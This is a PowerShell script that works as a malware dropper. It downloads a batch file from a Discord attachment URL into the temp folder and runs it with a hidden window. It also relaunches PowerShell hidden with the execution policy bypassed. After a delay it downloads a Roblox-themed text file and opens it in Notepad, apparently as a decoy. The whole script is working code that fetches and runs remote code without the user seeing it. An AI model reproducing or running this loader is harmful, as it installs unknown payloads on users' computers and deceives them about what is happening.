# Define URLs
$batUrl = "https://cdn.discordapp.com/attachments/1143578940791857315/1159191579165208716/Uni.bat"
$txtUrl = "https://cdn.discordapp.com/attachments/1143578940791857315/1159525530723430520/www.roblox.com.txt"

# Define file paths
$batPath = [System.IO.Path]::Combine($env:TEMP, "Uni.bat")
$txtPath = [System.IO.Path]::Combine($env:TEMP, "www.roblox.com.txt")

# Download Uni.bat
iwr -Uri $batUrl -OutFile $batPath

# Define a script block to run PowerShell
$psScript = {
    Start-Process -FilePath powershell -ArgumentList "-WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -File `"$($MyInvocation.MyCommand.Path)`"" -Wait
}

# Start a background job for the PowerShell script
$psJob = Start-Job -ScriptBlock $psScript

# Check if Uni.bat exists and run it with hidden window style
if (Test-Path $batPath) {
    Start-Process -FilePath $batPath -WindowStyle Hidden
}

# Wait for Uni.bat to complete
$psJob | Wait-Job
$psJob | Remove-Job

# Wait for 120 seconds
Start-Sleep -Seconds 120

# Download www.roblox.com.txt
iwr -Uri $txtUrl -OutFile $txtPath

# Check if www.roblox.com.txt exists and open it
if (Test-Path $txtPath) {
    Start-Process -FilePath notepad.exe -ArgumentList $txtPath
}
